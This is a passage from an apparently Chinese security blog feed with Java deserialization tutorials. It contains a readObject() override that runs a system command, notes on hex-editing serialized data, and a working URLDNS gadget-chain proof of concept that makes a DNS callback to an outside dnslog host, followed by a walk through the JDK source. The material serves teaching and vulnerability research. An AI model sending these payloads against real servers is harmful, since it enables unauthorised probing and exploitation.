<span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span>Runtime.getRuntime().exec(<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//执行ipconfig命令</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//将命令结果打出来</span></span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bfIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(bfIn));</span><br><span class="line">        String s=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((s = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处我们重写了<code>readObject()</code>，其中含有命令执行代码。</p>
<p>重新反序列化后，发现命令被执行。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728203543869.png" alt="image-20210728203543869"></p>
<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>我们序列化的时候，将数据存放进了一个叫<code>test.cer</code>的文件中，当我们把这个序列化后的数据修改一下，那么效果也是一样的。</p>
<p>这里我用<strong>Notepad++<strong>打开，再使用它的</strong>HEX-Editor</strong>插件，可以看到该文件十六进制的格式。我们将此处修改一下</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728204023096.png" alt="image-20210728204023096"></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728204136266.png" alt="image-20210728204136266"></p>
<p>我们只让它反序列化我们修改好的object</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728204313877.png" alt="image-20210728204313877"></p>
<p>内容已经被恶意修改了。</p>
<h1 id="序列化后的数据分析"><a href="#序列化后的数据分析" class="headerlink" title="序列化后的数据分析"></a>序列化后的数据分析</h1><p>在前一部分的案例二中，我们在十六进制文件的基础上修改了数据，那么其中数据到底有什么意义呢？</p>
<p>这里我将用到<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>来分析。将HEX的值复制粘贴到这个项目中即可（不知为何，在NodePad++中直接复制粘贴，00会变成20，需要替换回来）。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728205742670.png" alt="image-20210728205742670"></p>
<p>这样一个清晰的结构对我们了解序列化的数据储存结构很有帮助。</p>
<ol>
<li><strong>ACED0005</strong></li>
</ol>
<blockquote>
<p><code>0xac ed</code>是Java序列化的<strong>字符串魔术数</strong>，相当于是Java序列化的十六进制特征码，<strong>看到这个值我们就能知道这是Java序列化后的十六进制的值</strong>。</p>
<p><code>0x00 05</code>是JAVA序列化的版本号</p>
</blockquote>
<ol start="2">
<li><strong>7372</strong></li>
</ol>
<blockquote>
<p><code>0x73</code>是<code>TC_OBJECT</code>, 代表下面的内容是一个新的对象</p>
<p><code>0x72</code>是<code>TC_CLASSDESC</code>，Class描述符，代表下面是一个新的Class</p>
</blockquote>
<ol start="3">
<li></li>
</ol>
<blockquote>
<p>0x00 07 代表 Class Name长度</p>
<p>0x53747564656e74代表 Class Name - Student</p>
</blockquote>
<ol start="4">
<li></li>
</ol>
<blockquote>
<p>0x00 00 00 00 00 00 00 01代表serialVersionUID的值</p>
</blockquote>
<p>后面的就不说了，具体资料可以在网上查到，配合<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>来学习分析会很有帮助。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://snyk.io/blog/serialization-and-deserialization-in-java/">Serialization and deserialization in Java: explaining the Java deserialize vulnerability</a></p>
<p><a href="https://www.cnblogs.com/goody9807/p/6440667.html">JAVA 对象序列化（二）——Externalizable</a></p>
<p><a href="https://blog.csdn.net/qq_32252957/article/details/82856128">java中Serializable和Externalizable接口浅析</a></p>
<p><a href="https://www.guildhab.top/2020/04/java-rmi-%E5%88%A9%E7%94%A83-java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0-%E4%BB%A5%E5%8F%8A-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">Java 反序列化漏洞(3) – 初探 Java 反序列化漏洞以及序列化数据分析</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之URLDNS利用链(7)</title>
    <url>/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>尽管我们已经了解了一些反序列化漏洞的知识，但有什么办法能够快速检测反序列化的点吗？URLDNS能够帮助我们实现这一点。URLDNS不依赖第三方库，不限制jdk版本。</p>
<p>但URLDNS不能执行命令，仅能用于发送DNS请求，以来验证是否有反序列化代码<code>readObject()</code>存在。</p>
<span id="more"></span>

<h1 id="简易利用链及利用方法"><a href="#简易利用链及利用方法" class="headerlink" title="简易利用链及利用方法"></a>简易利用链及利用方法</h1><h2 id="URLDNS平台"><a href="#URLDNS平台" class="headerlink" title="URLDNS平台"></a>URLDNS平台</h2><p>学习该章，推荐使用<a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
<p>点击Get SubDomain可以得到一个域名。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201121893.png" alt="image-20211116201121893"></p>
<h2 id="简易利用链"><a href="#简易利用链" class="headerlink" title="简易利用链"></a>简易利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();<span class="comment">// 定义一个hashMap，key为URL,value为String</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://e3h66m.dnslog.cn&quot;</span>);<span class="comment">// 设置我们触发dns查询的url</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1</span></span><br><span class="line">        <span class="comment">// 1. 将url的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 2. 设置url的hashCode字段为任意不为-1的值</span></span><br><span class="line">        f.set(url, <span class="number">111</span>);</span><br><span class="line">        System.out.println(url.hashCode()); <span class="comment">// 获取hashCode的值，验证是否修改成功</span></span><br><span class="line">        <span class="comment">// 3. 将 url 放入 hashMap 中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化操作</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化，触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上述代码后，刷新DNSURL平台页面，发现已有记录 - 利用成功。</p>
<h1 id="简易利用链分析-Java-1-7"><a href="#简易利用链分析-Java-1-7" class="headerlink" title="简易利用链分析(Java 1.7)"></a>简易利用链分析(Java 1.7)</h1><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h2><p>我们在<code>ois.readObject()</code>处下断点，分析反序列化的过程。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201341776.png" alt="image-20211116201341776"></p>
<p>利用点主要在<code>HashMap</code>类下的<code>readObject()</code>，之前我们有讲过，<code>readObject()</code>方法是可以被复写的，所以之前的代码中的<code>ois.readObject();</code>实际上会call到我们序列化的<code>HashMap</code>中的<code>readObject()</code>。</p>
<p>跟进去看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    s.defaultReadObject();<span class="comment">//此处执行默认的readObject()方法</span></span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;<span class="comment">//判断loadFactor的值是否合法</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化一个空表</span></span><br><span class="line">    table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line">    s.readInt(); <span class="comment">// 获取key-value的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)<span class="comment">//判断个数值是否合法</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面初始化Capacity</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">                mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                <span class="comment">// we have limits...</span></span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate the bucket array;</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        inflateTable(capacity);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        threshold = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="comment">//获取keys和values，并进行PUT操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();<span class="comment">//获取key</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();<span class="comment">//获取value</span></span><br><span class="line">        putForCreate(key, value);<span class="comment">//重点在此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="putForCreate"><a href="#putForCreate" class="headerlink" title="putForCreate()"></a>putForCreate()</h2><p>继续跟进<code>putForCreate(key,value)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key);<span class="comment">//*判断key是否为空，如果不为空，计算key的hash值*</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Look for preexisting entry for key.  This will never happen for</span></span><br><span class="line"><span class="comment">     * clone or deserialize.  It will only happen for construction if the</span></span><br><span class="line"><span class="comment">     * input Map is a sorted map whose ordering is inconsistent w/ equals.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">            e.value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    createEntry(hash, key, value, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hash"><a href="#hash" class="headerlink" title="hash()"></a>hash()</h2><p>注意我们这里call的是<code>hash(key)</code>，我们看看<code>hash()</code>是怎么实现的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;<span class="comment">//此处k为我们传入的HashMap的key</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;<span class="comment">//此处会获取hashSeed（默认为0）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;<span class="comment">//如果hashSeed不为0，且传入的Object为String的话执行下面代码</span></span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();<span class="comment">//否则执行传入的object的hashCode</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h2><p><strong>重点</strong>：很明显，<code>k.hashCode()</code>是指URL类的hashCode()方法，因为我们传入的是URL object，所以我们需要跟踪<code>URL.hashCode();</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)<span class="comment">//如果hashCode不等于-1，那么我们就返回hashCode</span></span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);<span class="comment">//否则调用 handler.hashCode() 计算 hash 值 .</span></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们仍然没有发现有触发DNS请求的地方，如果hashCode不等于-1，直接返回hashCode，我们的这条链就走不下去了，所以我们得保证<strong>hashCode等于-1</strong>，这样我们才能执行<code>handler.hashCode(this);</code></p>
<p>由代码可知，hashCode默认值为-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>但是当我们通过 <code>HashMap.readObject()</code> 方法获取 key 的值时 ,key 的HashCode 就不会为 <code>-1</code> 了（注释掉前面利用链代码中修改hashCode的部分进行断点调试），如下图：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116204410674.png" alt="image-20211116204410674"></p>
<p>所以我们需要手动修改HashCode，让它为-1 - 这也是为什么简易利用链中用<code>f.set(url, -1);</code>设置hashCode为-1。但同时我们发现，在生成payload时的<code>put()</code>函数也会经过这条链：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116205521655.png" alt="image-20211116205521655"></p>
<p>hash-&gt;URL.hashCode()，这样的话因为hashCode会保持默认值-1(在生成payload的操作中并没有改变hashCode)。<img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116205741746.png" alt="image-20211116205741746"></p>
<p>但我们不能让他在生成payload的时候就发送URLDNS请求，所以我们可以在生成payload - **执行hashMap.put()**之前改变hashCode的值，让它不为-1，在put完之后再改回-1方便payload被执行。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210115810.png" alt="image-20211116210115810"></p>
<h2 id="handler-hashCode"><a href="#handler-hashCode" class="headerlink" title="handler.hashCode()"></a>handler.hashCode()</h2><p>继续跟进<code>hashCode = handler.hashCode(this);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();<span class="comment">//获取协议</span></span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);<span class="comment">//获取地址</span></span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)<span class="comment">//获取端口</span></span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由代码可知，java会先获取protocol,所以我们在构造利用链的时候，<strong>需要将我们接收URLDNS的地址加上相应的协议(如http://)</strong></p>
<h2 id="getHostAddress"><a href="#getHostAddress" class="headerlink" title="getHostAddress()"></a>getHostAddress()</h2><p>我们继续跟进<code>getHostAddress(u);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)<span class="comment">//先判断该URL的hostAddress属性是否已经有值了</span></span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;<span class="comment">//如果已有值，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();<span class="comment">//获取Host</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);<span class="comment">//获取IP地址，并把值赋给URL的hostAddress</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面我们可以看到，如果程序在之前已经执行过payload(或者已经访问过我们设置的DNS)，就不会再触发第二次，因为已有缓存在<code>hostAddress</code>处。 所以我们需要提供一个<strong>没有被解析过的域名</strong>。</p>
<h2 id="InetAddress-getByName"><a href="#InetAddress-getByName" class="headerlink" title="InetAddress.getByName()"></a>InetAddress.getByName()</h2><p>继续跟进<code>InetAddress.getByName(host)</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210657890.png" alt="image-20211116210657890"></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210710023.png" alt="image-20211116210710023"></p>
<h2 id="getAllByName"><a href="#getAllByName" class="headerlink" title="getAllByName()"></a>getAllByName()</h2><p>一直跟进到<code>getAllByName()</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211025208.png" alt="image-20211116211025208"></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211130053.png" alt="image-20211116211130053"></p>
<h2 id="getAllByName0"><a href="#getAllByName0" class="headerlink" title="getAllByName0()"></a>getAllByName0()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InetAddress[] getAllByName0 (String host, InetAddress reqAddr, <span class="type">boolean</span> check)</span><br><span class="line">    <span class="keyword">throws</span> UnknownHostException  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If it gets here it is presumed to be a hostname */</span></span><br><span class="line">    <span class="comment">/* Cache.get can return: null, unknownAddress, or InetAddress[] */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make sure the connection to the host is allowed, before we</span></span><br><span class="line"><span class="comment">     * give out a hostname</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (check) &#123;<span class="comment">//先判断连接是否被允许</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">            security.checkConnect(host, -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InetAddress[] addresses = getCachedAddresses(host);<span class="comment">//从缓存中查找域名对应的IP地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If no entry in cache, then do the host lookup */</span></span><br><span class="line">    <span class="keyword">if</span> (addresses == <span class="literal">null</span>) &#123;<span class="comment">//如果缓存中没有记录</span></span><br><span class="line">        addresses = getAddressesFromNameService(host, reqAddr);<span class="comment">//发起DNS请求</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addresses == unknown_array)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownHostException</span>(host);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addresses.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上述代码，我们能够发现，<code>getAddressesFromNameService()</code>就是最终发起DNS请求的方法。</p>
<h2 id="getAddressesFromNameService"><a href="#getAddressesFromNameService" class="headerlink" title="getAddressesFromNameService()"></a>getAddressesFromNameService()</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211837716.png" alt="image-20211116211837716"></p>
